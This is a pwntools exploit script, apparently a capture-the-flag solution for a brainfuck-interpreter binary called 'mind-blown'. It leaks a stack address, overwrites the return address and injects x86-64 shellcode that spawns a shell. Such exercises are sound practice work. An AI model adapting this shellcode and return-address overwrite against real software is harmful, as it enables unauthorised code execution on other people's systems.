from pwn import *

io = process('mind-blown')
shell_code = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

rbp_offset = 0x1010
ret_offset = 0x1010 + 0x8
''' brainfuck ~ mind blown :v
data[dataPointer]

 >  ++dataPointer
 .  putc(data[dataPointer], _bss_start)
 ,  data[dataPointer] = getc(stdin)
    ...
'''
payload = b''
payload += b'>' * rbp_offset  # move pointer to rbp_cache
payload += b'.>' * 8  # read rbp
payload += b',>' * 8  # write ret address
payload += b',>' * len(shell_code) # write shellcode

print(io.recvuntil('in your program: '))
io.sendline(str(len(payload)))

print(io.recvuntil('text below:\n'))
io.send(payload)

stack_addr = u64(io.read(8))
print(f"leaked rbp: {hex(stack_addr)}")
gdb.attach(io, gdbscript='''
init-pwndbg
''')
# runProgram has 0 parameters, so we go back 16 bytes (address and rbp of main)
ret_addr = stack_addr - 0x10
io.send(p64(ret_addr))
io.send(shell_code)

io.interactive()